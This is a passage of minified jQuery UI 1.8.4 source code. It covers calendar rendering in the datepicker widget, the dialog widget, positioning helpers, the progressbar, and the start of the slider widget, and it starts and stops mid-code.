"",D=0;D<i[1];D++){var J=this._daylightSavingAdjust(new Date(m,g,a.selectedDay)),t=" ui-corner-all",x="";if(l){x+='<div class="ui-datepicker-group';if(i[1]>1)switch(D){case 0:x+=" ui-datepicker-group-first";t=" ui-corner-"+(c?"right":"left");break;case i[1]-1:x+=" ui-datepicker-group-last";t=" ui-corner-"+(c?"left":"right");break;default:x+=" ui-datepicker-group-middle";t="";break}x+='">'}x+='<div class="ui-datepicker-header ui-widget-header ui-helper-clearfix'+t+'">'+(/all|left/.test(t)&&C==0?c?
f:n:"")+(/all|right/.test(t)&&C==0?c?n:f:"")+this._generateMonthYearHeader(a,g,m,j,o,C>0||D>0,z,v)+'</div><table class="ui-datepicker-calendar"><thead><tr>';var A=k?'<th class="ui-datepicker-week-col">'+this._get(a,"weekHeader")+"</th>":"";for(t=0;t<7;t++){var q=(t+h)%7;A+="<th"+((t+h+6)%7>=5?' class="ui-datepicker-week-end"':"")+'><span title="'+r[q]+'">'+s[q]+"</span></th>"}x+=A+"</tr></thead><tbody>";A=this._getDaysInMonth(m,g);if(m==a.selectedYear&&g==a.selectedMonth)a.selectedDay=Math.min(a.selectedDay,
A);t=(this._getFirstDayOfMonth(m,g)-h+7)%7;A=l?6:Math.ceil((t+A)/7);q=this._daylightSavingAdjust(new Date(m,g,1-t));for(var O=0;O<A;O++){x+="<tr>";var P=!k?"":'<td class="ui-datepicker-week-col">'+this._get(a,"calculateWeek")(q)+"</td>";for(t=0;t<7;t++){var F=p?p.apply(a.input?a.input[0]:null,[q]):[true,""],B=q.getMonth()!=g,K=B&&!H||!F[0]||j&&q<j||o&&q>o;P+='<td class="'+((t+h+6)%7>=5?" ui-datepicker-week-end":"")+(B?" ui-datepicker-other-month":"")+(q.getTime()==J.getTime()&&g==a.selectedMonth&&
a._keyEvent||M.getTime()==q.getTime()&&M.getTime()==J.getTime()?" "+this._dayOverClass:"")+(K?" "+this._unselectableClass+" ui-state-disabled":"")+(B&&!w?"":" "+F[1]+(q.getTime()==u.getTime()?" "+this._currentClass:"")+(q.getTime()==b.getTime()?" ui-datepicker-today":""))+'"'+((!B||w)&&F[2]?' title="'+F[2]+'"':"")+(K?"":' onclick="DP_jQuery_'+y+".datepicker._selectDay('#"+a.id+"',"+q.getMonth()+","+q.getFullYear()+', this);return false;"')+">"+(B&&!w?"&#xa0;":K?'<span class="ui-state-default">'+q.getDate()+
"</span>":'<a class="ui-state-default'+(q.getTime()==b.getTime()?" ui-state-highlight":"")+(q.getTime()==J.getTime()?" ui-state-active":"")+(B?" ui-priority-secondary":"")+'" href="#">'+q.getDate()+"</a>")+"</td>";q.setDate(q.getDate()+1);q=this._daylightSavingAdjust(q)}x+=P+"</tr>"}g++;if(g>11){g=0;m++}x+="</tbody></table>"+(l?"</div>"+(i[0]>0&&D==i[1]-1?'<div class="ui-datepicker-row-break"></div>':""):"");N+=x}I+=N}I+=e+(d.browser.msie&&parseInt(d.browser.version,10)<7&&!a.inline?'<iframe src="javascript:false;" class="ui-datepicker-cover" frameborder="0"></iframe>':
"");a._keyEvent=false;return I},_generateMonthYearHeader:function(a,b,c,e,f,h,i,g){var k=this._get(a,"changeMonth"),l=this._get(a,"changeYear"),u=this._get(a,"showMonthAfterYear"),j='<div class="ui-datepicker-title">',o="";if(h||!k)o+='<span class="ui-datepicker-month">'+i[b]+"</span>";else{i=e&&e.getFullYear()==c;var m=f&&f.getFullYear()==c;o+='<select class="ui-datepicker-month" onchange="DP_jQuery_'+y+".datepicker._selectMonthYear('#"+a.id+"', this, 'M');\" onclick=\"DP_jQuery_"+y+".datepicker._clickMonthYear('#"+
a.id+"');\">";for(var n=0;n<12;n++)if((!i||n>=e.getMonth())&&(!m||n<=f.getMonth()))o+='<option value="'+n+'"'+(n==b?' selected="selected"':"")+">"+g[n]+"</option>";o+="</select>"}u||(j+=o+(h||!(k&&l)?"&#xa0;":""));if(h||!l)j+='<span class="ui-datepicker-year">'+c+"</span>";else{g=this._get(a,"yearRange").split(":");var r=(new Date).getFullYear();i=function(s){s=s.match(/c[+-].*/)?c+parseInt(s.substring(1),10):s.match(/[+-].*/)?r+parseInt(s,10):parseInt(s,10);return isNaN(s)?r:s};b=i(g[0]);g=Math.max(b,
i(g[1]||""));b=e?Math.max(b,e.getFullYear()):b;g=f?Math.min(g,f.getFullYear()):g;for(j+='<select class="ui-datepicker-year" onchange="DP_jQuery_'+y+".datepicker._selectMonthYear('#"+a.id+"', this, 'Y');\" onclick=\"DP_jQuery_"+y+".datepicker._clickMonthYear('#"+a.id+"');\">";b<=g;b++)j+='<option value="'+b+'"'+(b==c?' selected="selected"':"")+">"+b+"</option>";j+="</select>"}j+=this._get(a,"yearSuffix");if(u)j+=(h||!(k&&l)?"&#xa0;":"")+o;j+="</div>";return j},_adjustInstDate:function(a,b,c){var e=
a.drawYear+(c=="Y"?b:0),f=a.drawMonth+(c=="M"?b:0);b=Math.min(a.selectedDay,this._getDaysInMonth(e,f))+(c=="D"?b:0);e=this._restrictMinMax(a,this._daylightSavingAdjust(new Date(e,f,b)));a.selectedDay=e.getDate();a.drawMonth=a.selectedMonth=e.getMonth();a.drawYear=a.selectedYear=e.getFullYear();if(c=="M"||c=="Y")this._notifyChange(a)},_restrictMinMax:function(a,b){var c=this._getMinMaxDate(a,"min");a=this._getMinMaxDate(a,"max");b=c&&b<c?c:b;return b=a&&b>a?a:b},_notifyChange:function(a){var b=this._get(a,
"onChangeMonthYear");if(b)b.apply(a.input?a.input[0]:null,[a.selectedYear,a.selectedMonth+1,a])},_getNumberOfMonths:function(a){a=this._get(a,"numberOfMonths");return a==null?[1,1]:typeof a=="number"?[1,a]:a},_getMinMaxDate:function(a,b){return this._determineDate(a,this._get(a,b+"Date"),null)},_getDaysInMonth:function(a,b){return 32-(new Date(a,b,32)).getDate()},_getFirstDayOfMonth:function(a,b){return(new Date(a,b,1)).getDay()},_canAdjustMonth:function(a,b,c,e){var f=this._getNumberOfMonths(a);
c=this._daylightSavingAdjust(new Date(c,e+(b<0?b:f[0]*f[1]),1));b<0&&c.setDate(this._getDaysInMonth(c.getFullYear(),c.getMonth()));return this._isInRange(a,c)},_isInRange:function(a,b){var c=this._getMinMaxDate(a,"min");a=this._getMinMaxDate(a,"max");return(!c||b.getTime()>=c.getTime())&&(!a||b.getTime()<=a.getTime())},_getFormatConfig:function(a){var b=this._get(a,"shortYearCutoff");b=typeof b!="string"?b:(new Date).getFullYear()%100+parseInt(b,10);return{shortYearCutoff:b,dayNamesShort:this._get(a,
"dayNamesShort"),dayNames:this._get(a,"dayNames"),monthNamesShort:this._get(a,"monthNamesShort"),monthNames:this._get(a,"monthNames")}},_formatDate:function(a,b,c,e){if(!b){a.currentDay=a.selectedDay;a.currentMonth=a.selectedMonth;a.currentYear=a.selectedYear}b=b?typeof b=="object"?b:this._daylightSavingAdjust(new Date(e,c,b)):this._daylightSavingAdjust(new Date(a.currentYear,a.currentMonth,a.currentDay));return this.formatDate(this._get(a,"dateFormat"),b,this._getFormatConfig(a))}});d.fn.datepicker=
function(a){if(!d.datepicker.initialized){d(document).mousedown(d.datepicker._checkExternalClick).find("body").append(d.datepicker.dpDiv);d.datepicker.initialized=true}var b=Array.prototype.slice.call(arguments,1);if(typeof a=="string"&&(a=="isDisabled"||a=="getDate"||a=="widget"))return d.datepicker["_"+a+"Datepicker"].apply(d.datepicker,[this[0]].concat(b));if(a=="option"&&arguments.length==2&&typeof arguments[1]=="string")return d.datepicker["_"+a+"Datepicker"].apply(d.datepicker,[this[0]].concat(b));
return this.each(function(){typeof a=="string"?d.datepicker["_"+a+"Datepicker"].apply(d.datepicker,[this].concat(b)):d.datepicker._attachDatepicker(this,a)})};d.datepicker=new L;d.datepicker.initialized=false;d.datepicker.uuid=(new Date).getTime();d.datepicker.version="1.8.4";window["DP_jQuery_"+y]=d})(jQuery);
(function(c,j){c.widget("ui.dialog",{options:{autoOpen:true,buttons:{},closeOnEscape:true,closeText:"close",dialogClass:"",draggable:true,hide:null,height:"auto",maxHeight:false,maxWidth:false,minHeight:150,minWidth:150,modal:false,position:{my:"center",at:"center",of:window,collision:"fit",using:function(a){var b=c(this).css(a).offset().top;b<0&&c(this).css("top",a.top-b)}},resizable:true,show:null,stack:true,title:"",width:300,zIndex:1E3},_create:function(){this.originalTitle=this.element.attr("title");
if(typeof this.originalTitle!=="string")this.originalTitle="";var a=this,b=a.options,d=b.title||a.originalTitle||"&#160;",f=c.ui.dialog.getTitleId(a.element),g=(a.uiDialog=c("<div></div>")).appendTo(document.body).hide().addClass("ui-dialog ui-widget ui-widget-content ui-corner-all "+b.dialogClass).css({zIndex:b.zIndex}).attr("tabIndex",-1).css("outline",0).keydown(function(i){if(b.closeOnEscape&&i.keyCode&&i.keyCode===c.ui.keyCode.ESCAPE){a.close(i);i.preventDefault()}}).attr({role:"dialog","aria-labelledby":f}).mousedown(function(i){a.moveToTop(false,
i)});a.element.show().removeAttr("title").addClass("ui-dialog-content ui-widget-content").appendTo(g);var e=(a.uiDialogTitlebar=c("<div></div>")).addClass("ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix").prependTo(g),h=c('<a href="#"></a>').addClass("ui-dialog-titlebar-close ui-corner-all").attr("role","button").hover(function(){h.addClass("ui-state-hover")},function(){h.removeClass("ui-state-hover")}).focus(function(){h.addClass("ui-state-focus")}).blur(function(){h.removeClass("ui-state-focus")}).click(function(i){a.close(i);
return false}).appendTo(e);(a.uiDialogTitlebarCloseText=c("<span></span>")).addClass("ui-icon ui-icon-closethick").text(b.closeText).appendTo(h);c("<span></span>").addClass("ui-dialog-title").attr("id",f).html(d).prependTo(e);if(c.isFunction(b.beforeclose)&&!c.isFunction(b.beforeClose))b.beforeClose=b.beforeclose;e.find("*").add(e).disableSelection();b.draggable&&c.fn.draggable&&a._makeDraggable();b.resizable&&c.fn.resizable&&a._makeResizable();a._createButtons(b.buttons);a._isOpen=false;c.fn.bgiframe&&
g.bgiframe()},_init:function(){this.options.autoOpen&&this.open()},destroy:function(){var a=this;a.overlay&&a.overlay.destroy();a.uiDialog.hide();a.element.unbind(".dialog").removeData("dialog").removeClass("ui-dialog-content ui-widget-content").hide().appendTo("body");a.uiDialog.remove();a.originalTitle&&a.element.attr("title",a.originalTitle);return a},widget:function(){return this.uiDialog},close:function(a){var b=this,d;if(false!==b._trigger("beforeClose",a)){b.overlay&&b.overlay.destroy();b.uiDialog.unbind("keypress.ui-dialog");
b._isOpen=false;if(b.options.hide)b.uiDialog.hide(b.options.hide,function(){b._trigger("close",a)});else{b.uiDialog.hide();b._trigger("close",a)}c.ui.dialog.overlay.resize();if(b.options.modal){d=0;c(".ui-dialog").each(function(){if(this!==b.uiDialog[0])d=Math.max(d,c(this).css("z-index"))});c.ui.dialog.maxZ=d}return b}},isOpen:function(){return this._isOpen},moveToTop:function(a,b){var d=this,f=d.options;if(f.modal&&!a||!f.stack&&!f.modal)return d._trigger("focus",b);if(f.zIndex>c.ui.dialog.maxZ)c.ui.dialog.maxZ=
f.zIndex;if(d.overlay){c.ui.dialog.maxZ+=1;d.overlay.$el.css("z-index",c.ui.dialog.overlay.maxZ=c.ui.dialog.maxZ)}a={scrollTop:d.element.attr("scrollTop"),scrollLeft:d.element.attr("scrollLeft")};c.ui.dialog.maxZ+=1;d.uiDialog.css("z-index",c.ui.dialog.maxZ);d.element.attr(a);d._trigger("focus",b);return d},open:function(){if(!this._isOpen){var a=this,b=a.options,d=a.uiDialog;a.overlay=b.modal?new c.ui.dialog.overlay(a):null;d.next().length&&d.appendTo("body");a._size();a._position(b.position);d.show(b.show);
a.moveToTop(true);b.modal&&d.bind("keypress.ui-dialog",function(f){if(f.keyCode===c.ui.keyCode.TAB){var g=c(":tabbable",this),e=g.filter(":first");g=g.filter(":last");if(f.target===g[0]&&!f.shiftKey){e.focus(1);return false}else if(f.target===e[0]&&f.shiftKey){g.focus(1);return false}}});c(a.element.find(":tabbable").get().concat(d.find(".ui-dialog-buttonpane :tabbable").get().concat(d.get()))).eq(0).focus();a._trigger("open");a._isOpen=true;return a}},_createButtons:function(a){var b=this,d=false,
f=c("<div></div>").addClass("ui-dialog-buttonpane ui-widget-content ui-helper-clearfix"),g=c("<div></div>").addClass("ui-dialog-buttonset").appendTo(f);b.uiDialog.find(".ui-dialog-buttonpane").remove();typeof a==="object"&&a!==null&&c.each(a,function(){return!(d=true)});if(d){c.each(a,function(e,h){e=c('<button type="button"></button>').text(e).click(function(){h.apply(b.element[0],arguments)}).appendTo(g);c.fn.button&&e.button()});f.appendTo(b.uiDialog)}},_makeDraggable:function(){function a(e){return{position:e.position,
offset:e.offset}}var b=this,d=b.options,f=c(document),g;b.uiDialog.draggable({cancel:".ui-dialog-content, .ui-dialog-titlebar-close",handle:".ui-dialog-titlebar",containment:"document",start:function(e,h){g=d.height==="auto"?"auto":c(this).height();c(this).height(c(this).height());c(this).addClass("ui-dialog-dragging");b._trigger("dragStart",e,a(h))},drag:function(e,h){b._trigger("drag",e,a(h))},stop:function(e,h){d.position=[h.position.left-f.scrollLeft(),h.position.top-f.scrollTop()];c(this).removeClass("ui-dialog-dragging").height(g);
b._trigger("dragStop",e,a(h));c.ui.dialog.overlay.resize()}})},_makeResizable:function(a){function b(e){return{originalPosition:e.originalPosition,originalSize:e.originalSize,position:e.position,size:e.size}}a=a===j?this.options.resizable:a;var d=this,f=d.options,g=d.uiDialog.css("position");a=typeof a==="string"?a:"n,e,s,w,se,sw,ne,nw";d.uiDialog.resizable({cancel:".ui-dialog-content",containment:"document",alsoResize:d.element,maxWidth:f.maxWidth,maxHeight:f.maxHeight,minWidth:f.minWidth,minHeight:d._minHeight(),
handles:a,start:function(e,h){c(this).addClass("ui-dialog-resizing");d._trigger("resizeStart",e,b(h))},resize:function(e,h){d._trigger("resize",e,b(h))},stop:function(e,h){c(this).removeClass("ui-dialog-resizing");f.height=c(this).height();f.width=c(this).width();d._trigger("resizeStop",e,b(h));c.ui.dialog.overlay.resize()}}).css("position",g).find(".ui-resizable-se").addClass("ui-icon ui-icon-grip-diagonal-se")},_minHeight:function(){var a=this.options;return a.height==="auto"?a.minHeight:Math.min(a.minHeight,
a.height)},_position:function(a){var b=[],d=[0,0],f;if(a){if(typeof a==="string"||typeof a==="object"&&"0"in a){b=a.split?a.split(" "):[a[0],a[1]];if(b.length===1)b[1]=b[0];c.each(["left","top"],function(g,e){if(+b[g]===b[g]){d[g]=b[g];b[g]=e}});a={my:b.join(" "),at:b.join(" "),offset:d.join(" ")}}a=c.extend({},c.ui.dialog.prototype.options.position,a)}else a=c.ui.dialog.prototype.options.position;(f=this.uiDialog.is(":visible"))||this.uiDialog.show();this.uiDialog.css({top:0,left:0}).position(a);
f||this.uiDialog.hide()},_setOption:function(a,b){var d=this,f=d.uiDialog,g=f.is(":data(resizable)"),e=false;switch(a){case "beforeclose":a="beforeClose";break;case "buttons":d._createButtons(b);e=true;break;case "closeText":d.uiDialogTitlebarCloseText.text(""+b);break;case "dialogClass":f.removeClass(d.options.dialogClass).addClass("ui-dialog ui-widget ui-widget-content ui-corner-all "+b);break;case "disabled":b?f.addClass("ui-dialog-disabled"):f.removeClass("ui-dialog-disabled");break;case "draggable":b?
d._makeDraggable():f.draggable("destroy");break;case "height":e=true;break;case "maxHeight":g&&f.resizable("option","maxHeight",b);e=true;break;case "maxWidth":g&&f.resizable("option","maxWidth",b);e=true;break;case "minHeight":g&&f.resizable("option","minHeight",b);e=true;break;case "minWidth":g&&f.resizable("option","minWidth",b);e=true;break;case "position":d._position(b);break;case "resizable":g&&!b&&f.resizable("destroy");g&&typeof b==="string"&&f.resizable("option","handles",b);!g&&b!==false&&
d._makeResizable(b);break;case "title":c(".ui-dialog-title",d.uiDialogTitlebar).html(""+(b||"&#160;"));break;case "width":e=true;break}c.Widget.prototype._setOption.apply(d,arguments);e&&d._size()},_size:function(){var a=this.options,b;this.element.css({width:"auto",minHeight:0,height:0});if(a.minWidth>a.width)a.width=a.minWidth;b=this.uiDialog.css({height:"auto",width:a.width}).height();this.element.css(a.height==="auto"?{minHeight:Math.max(a.minHeight-b,0),height:"auto"}:{minHeight:0,height:Math.max(a.height-
b,0)}).show();this.uiDialog.is(":data(resizable)")&&this.uiDialog.resizable("option","minHeight",this._minHeight())}});c.extend(c.ui.dialog,{version:"1.8.4",uuid:0,maxZ:0,getTitleId:function(a){a=a.attr("id");if(!a){this.uuid+=1;a=this.uuid}return"ui-dialog-title-"+a},overlay:function(a){this.$el=c.ui.dialog.overlay.create(a)}});c.extend(c.ui.dialog.overlay,{instances:[],oldInstances:[],maxZ:0,events:c.map("focus,mousedown,mouseup,keydown,keypress,click".split(","),function(a){return a+".dialog-overlay"}).join(" "),
create:function(a){if(this.instances.length===0){setTimeout(function(){c.ui.dialog.overlay.instances.length&&c(document).bind(c.ui.dialog.overlay.events,function(d){return c(d.target).zIndex()>=c.ui.dialog.overlay.maxZ})},1);c(document).bind("keydown.dialog-overlay",function(d){if(a.options.closeOnEscape&&d.keyCode&&d.keyCode===c.ui.keyCode.ESCAPE){a.close(d);d.preventDefault()}});c(window).bind("resize.dialog-overlay",c.ui.dialog.overlay.resize)}var b=(this.oldInstances.pop()||c("<div></div>").addClass("ui-widget-overlay")).appendTo(document.body).css({width:this.width(),
height:this.height()});c.fn.bgiframe&&b.bgiframe();this.instances.push(b);return b},destroy:function(a){this.oldInstances.push(this.instances.splice(c.inArray(a,this.instances),1)[0]);this.instances.length===0&&c([document,window]).unbind(".dialog-overlay");a.remove();var b=0;c.each(this.instances,function(){b=Math.max(b,this.css("z-index"))});this.maxZ=b},height:function(){var a,b;if(c.browser.msie&&c.browser.version<7){a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight);
b=Math.max(document.documentElement.offsetHeight,document.body.offsetHeight);return a<b?c(window).height()+"px":a+"px"}else return c(document).height()+"px"},width:function(){var a,b;if(c.browser.msie&&c.browser.version<7){a=Math.max(document.documentElement.scrollWidth,document.body.scrollWidth);b=Math.max(document.documentElement.offsetWidth,document.body.offsetWidth);return a<b?c(window).width()+"px":a+"px"}else return c(document).width()+"px"},resize:function(){var a=c([]);c.each(c.ui.dialog.overlay.instances,
function(){a=a.add(this)});a.css({width:0,height:0}).css({width:c.ui.dialog.overlay.width(),height:c.ui.dialog.overlay.height()})}});c.extend(c.ui.dialog.overlay.prototype,{destroy:function(){c.ui.dialog.overlay.destroy(this.$el)}})})(jQuery);
(function(c){c.ui=c.ui||{};var m=/left|center|right/,n=/top|center|bottom/,p=c.fn.position,q=c.fn.offset;c.fn.position=function(a){if(!a||!a.of)return p.apply(this,arguments);a=c.extend({},a);var b=c(a.of),d=(a.collision||"flip").split(" "),e=a.offset?a.offset.split(" "):[0,0],g,h,i;if(a.of.nodeType===9){g=b.width();h=b.height();i={top:0,left:0}}else if(a.of.scrollTo&&a.of.document){g=b.width();h=b.height();i={top:b.scrollTop(),left:b.scrollLeft()}}else if(a.of.preventDefault){a.at="left top";g=h=
0;i={top:a.of.pageY,left:a.of.pageX}}else{g=b.outerWidth();h=b.outerHeight();i=b.offset()}c.each(["my","at"],function(){var f=(a[this]||"").split(" ");if(f.length===1)f=m.test(f[0])?f.concat(["center"]):n.test(f[0])?["center"].concat(f):["center","center"];f[0]=m.test(f[0])?f[0]:"center";f[1]=n.test(f[1])?f[1]:"center";a[this]=f});if(d.length===1)d[1]=d[0];e[0]=parseInt(e[0],10)||0;if(e.length===1)e[1]=e[0];e[1]=parseInt(e[1],10)||0;if(a.at[0]==="right")i.left+=g;else if(a.at[0]==="center")i.left+=
g/2;if(a.at[1]==="bottom")i.top+=h;else if(a.at[1]==="center")i.top+=h/2;i.left+=e[0];i.top+=e[1];return this.each(function(){var f=c(this),k=f.outerWidth(),l=f.outerHeight(),j=c.extend({},i);if(a.my[0]==="right")j.left-=k;else if(a.my[0]==="center")j.left-=k/2;if(a.my[1]==="bottom")j.top-=l;else if(a.my[1]==="center")j.top-=l/2;j.left=parseInt(j.left);j.top=parseInt(j.top);c.each(["left","top"],function(o,r){c.ui.position[d[o]]&&c.ui.position[d[o]][r](j,{targetWidth:g,targetHeight:h,elemWidth:k,
elemHeight:l,offset:e,my:a.my,at:a.at})});c.fn.bgiframe&&f.bgiframe();f.offset(c.extend(j,{using:a.using}))})};c.ui.position={fit:{left:function(a,b){var d=c(window);b=a.left+b.elemWidth-d.width()-d.scrollLeft();a.left=b>0?a.left-b:Math.max(0,a.left)},top:function(a,b){var d=c(window);b=a.top+b.elemHeight-d.height()-d.scrollTop();a.top=b>0?a.top-b:Math.max(0,a.top)}},flip:{left:function(a,b){if(b.at[0]!=="center"){var d=c(window);d=a.left+b.elemWidth-d.width()-d.scrollLeft();var e=b.my[0]==="left"?
-b.elemWidth:b.my[0]==="right"?b.elemWidth:0,g=-2*b.offset[0];a.left+=a.left<0?e+b.targetWidth+g:d>0?e-b.targetWidth+g:0}},top:function(a,b){if(b.at[1]!=="center"){var d=c(window);d=a.top+b.elemHeight-d.height()-d.scrollTop();var e=b.my[1]==="top"?-b.elemHeight:b.my[1]==="bottom"?b.elemHeight:0,g=b.at[1]==="top"?b.targetHeight:-b.targetHeight,h=-2*b.offset[1];a.top+=a.top<0?e+b.targetHeight+h:d>0?e+g+h:0}}}};if(!c.offset.setOffset){c.offset.setOffset=function(a,b){if(/static/.test(c.curCSS(a,"position")))a.style.position=
"relative";var d=c(a),e=d.offset(),g=parseInt(c.curCSS(a,"top",true),10)||0,h=parseInt(c.curCSS(a,"left",true),10)||0;e={top:b.top-e.top+g,left:b.left-e.left+h};"using"in b?b.using.call(a,e):d.css(e)};c.fn.offset=function(a){var b=this[0];if(!b||!b.ownerDocument)return null;if(a)return this.each(function(){c.offset.setOffset(this,a)});return q.call(this)}}})(jQuery);
(function(b,c){b.widget("ui.progressbar",{options:{value:0},min:0,max:100,_create:function(){this.element.addClass("ui-progressbar ui-widget ui-widget-content ui-corner-all").attr({role:"progressbar","aria-valuemin":this.min,"aria-valuemax":this.max,"aria-valuenow":this._value()});this.valueDiv=b("<div class='ui-progressbar-value ui-widget-header ui-corner-left'></div>").appendTo(this.element);this._refreshValue()},destroy:function(){this.element.removeClass("ui-progressbar ui-widget ui-widget-content ui-corner-all").removeAttr("role").removeAttr("aria-valuemin").removeAttr("aria-valuemax").removeAttr("aria-valuenow");
this.valueDiv.remove();b.Widget.prototype.destroy.apply(this,arguments)},value:function(a){if(a===c)return this._value();this._setOption("value",a);return this},_setOption:function(a,d){if(a==="value"){this.options.value=d;this._refreshValue();this._trigger("change")}b.Widget.prototype._setOption.apply(this,arguments)},_value:function(){var a=this.options.value;if(typeof a!=="number")a=0;return Math.min(this.max,Math.max(this.min,a))},_refreshValue:function(){var a=this.value();this.valueDiv.toggleClass("ui-corner-right",
a===this.max).width(a+"%");this.element.attr("aria-valuenow",a)}});b.extend(b.ui.progressbar,{version:"1.8.4"})})(jQuery);
(function(d){d.widget("ui.slider",d.ui.mouse,{widgetEventPrefix:"slide",options:{animate:false,distance:0,max:100,min:0,orientation:"horizontal",range:false,step:1,value:0,values:null},_create:function(){var a=this,b=this.options;this._mouseSliding=this._keySliding=false;this._animateOff=true;this._handleIndex=null;this._detectOrientation();this._mouseInit();this.element.addClass("ui-slider ui-slider-"+this.orientation+" ui-widget ui-widget-content ui-corner-all");b.disabled&&this.element.addClass("ui-slider-disabled ui-disabled");
this.range=d([]);if(b.range){if(b.range===true){this.range=d("<div></div>");if(!b.values)b.values=[this._valueMin(),this._valueMin()];if(b.values.length&&b.values.length!==2)b.values=[b.values[0],b.values[0]]}else this.range=d("<div></div>");this.range.appendTo(this.element).addClass("ui-slider-range");if(b.range==="min"||b.range==="max")this.range.addClass("ui-slider-range-"+b.range);this.range.addClass("ui-widget-header")}d(".ui-slider-handle",this.element).length===0&&d("<a href='#'></a>").appendTo(this.element).addClass("ui-slider-handle");
if(b.values&&b.values.length)for(;d(".ui-slider-handle",this.element).length<b.values.length;)d("<a href='#'></a>").appendTo(this.element).addClass("ui-slider-handle");this.handles=d(".ui-slider-handle",this.element).addClass("ui-state-default ui-corner-all");this.handle=this.handles.eq(0);this.handles.add(this.range).filter("a").click(function(c){c.preventDefault()}).hover(function(){b.disabled||d(this).addClass("ui-state-hover")},function(){d(this).removeClass("ui-state-hover")}).focus(function(){if(b.disabled)d(this).blur();
else{d(".ui-slider .ui-state-focus").removeClass("ui-state-focus");d(this).addClass("ui-state-focus")}}).blur(function(){d(this).removeClass("ui-state-focus")});this.handles.each(function(c){d(this).data("index.ui-slider-handle",c)});this.handles.keydown(function(c){var e=true,f=d(this).data("index.ui-slider-handle"),h,g,i;if(!a.options.disabled){switch(c.keyCode){case d.ui.keyCode.HOME:case d.ui.keyCode.END:case d.ui.keyCode.PAGE_UP:case d.ui.keyCode.PAGE_DOWN:case d.ui.keyCode.UP:case d.ui.keyCode.RIGHT:case d.ui.keyCode.DOWN:case d.ui.keyCode.LEFT:e=
false;if(!a._keySliding){a._keySliding=true;d(this).addClass("ui-state-active");h=a._start(c,f);if(h===false)return}break}i=a.options.step;h=a.options.values&&a.options.values.length?(g=a.values(f)):(g=a.value());switch(c.keyCode){case d.ui.keyCode.HOME:g=a._valueMin();break;case d.ui.keyCode.END:g=a._valueMax();break;case d.ui.keyCode.PAGE_UP:g=a._trimAlignValue(h+(a._valueMax()-a._valueMin())/5);break;case d.ui.keyCode.PAGE_DOWN:g=a._trimAlignValue(h-(a._valueMax()-a._valueMin())/5);break;case d.ui.keyCode.UP:case d.ui.keyCode.RIGHT:if(h===
a._valueMax())return;g=a._trimAlignValue(h+i);break;case d.ui.keyCode.DOWN:case d.ui.keyCode.LEFT:if(h===a._valueMin())return;g=a._trimAlignValue(h-i);break}a._slide(c,f,g);return e}}).keyup(function(c){var e=d(this).data("index.ui-slider-handle");if(a._keySliding){a._keySliding=false;a._stop(c,e);a._change(c,e);d(this).removeClass("ui-state-active")}});this._refreshValue();this._animateOff=false},destroy:function(){this.handles.remove();this.range.remove();this.element.removeClass("ui-slider ui-slider-horizontal ui-slider-vertical ui-slider-disabled ui-widget ui-widget-content ui-corner-all").removeData("slider").unbind(".slider");
this._mouseDestroy();return this},_mouseCapture:function(a){var b=this.options,c,e,f,h,g;if(b.disabled)return false;this.elementSize={width:this.element.outerWidth(),height:this.element.outerHeight()};this.elementOffset=this.element.offset();c=this._normValueFromMouse({x:a.pageX,y:a.pageY});e=this._valueMax()-this._valueMin()+1;h=this;this.handles.each(function(i){var j=Math.abs(c-h.values(i));if(e>j){e=j;f=d(this);g=i}});if(b.range===true&&this.values(1)===b.min){g+=1;f=d(this.handles[g])}if(this._start(a,
g)===false)return false;this._mouseSliding=true;h._handleIndex=g;f.addClass("ui-state-active").focus();b=f.offset();this._clickOffset=!d(a.target).parents().andSelf().is(".ui-slider-handle")?{left:0,top:0}:{left:a.pageX-b.left-f.width()/2,top:a.pageY-b.top-f.height()/2-(parseInt(f.css("borderTopWidth"),10)||0)-(parseInt(f.css("borderBottomWidth"),10)||0)+(parseInt(f.css("marginTop"),10)||0)};this._slide(a,g,c);return this._animateOff=true},_mouseStart:function(){return true},_mouseDrag:function(a){var b=
this._normValueFromMouse({x:a.pageX,y:a.pageY});this._slide(a,this._handleIndex,b);return false},_mouseStop:function(a){this.handles.removeClass("ui-state-active");this._mouseSliding=false;this._stop(a,this._handleIndex);this._change(a,this._handleIndex);this._clickOffset=this._handleIndex=null;return this._animateOff=false},_detectOrientation:function(){this.orientation=this.options.orientation==="vertical"?"vertical":"horizontal"},_normValueFromMouse:function(a){var b;if(this.orientation==="horizontal"){b=
this.elementSize.width;a=a.x-this.elementOffset.left-(this._clickOffset?this._clickOffset.left:0)}else{b=this.elementSize.height;a=a.y-this.elementOffset.top-(this._clickOffset?this._clickOffset.top:0)}b=a/b;if(b>1)b=1;if(b<0)b=0;if(this.orientation==="vertical")b=1-b;a=this._valueMax()-this._valueMin();return this._trimAlignValue(this._valueMin()+b*a)},_start:function(a,b){var c={handle:this.handles[b],value:this.value()};if(this.options.values&&this.options.values.length){c.value=this.values(b);
c.values=this.values()}return this._trigger("start",a,c)},_slide:function(a,b,c){var e;if(this.options.values&&this.options.values.length){e=this.values(b?0:1);if(this.options.values.length===2&&this.options.range===true&&(b===0&&c>e||b===1&&c<e))c=e;if(c!==this.values(b)){e=this.values();e[b]=c;a=this._trigger("slide",a,{handle:this.handles[b],value:c,values:e});this.values(b?0:1);a!==false&&this.values(b,c,true)}}else if(c!==this.value()){a=this._trigger("slide",a,{handle:this.handles[b],value:c});
a!==false&&this.value(c)}},_stop:function(a,b){var c={handle:this.handles[b],value:this.value()};if(this.options.values&&this.options.values.length){c.value=this.values(b);c.values=this.values()}this._trigger("stop",a,c)},_change:function(a,b){if(!this._keySliding&&!this._mouseSliding){var c={handle:this.handles[b],value:this.value()};if(this.options.values&&this.options.values.length){c.value=this.values(b);c.values=this.values()}this._trigger("change",a,c)}},value:function(a){if(arguments.length){this.options.value=
this._trimAlignValue(a);this._refreshValue();this._change(null,0)}return this._value()},values:function(a,b){var c,e,f;if(arguments.length>1){this.options.values[a]=this._trimAlignValue(b);this._refreshValue();this._change(null,a)}if(arguments.length)if(d.isArray(arguments[0])){c=this.options.values;e=arguments[0];for(f=0;f<c.length;f+=1){c[f]=this._trimAlignValue(e[f]);this._change(null,f)}this._refreshValue()}else return this.options.values&&this.options.values.length?this._values(a):this.value();
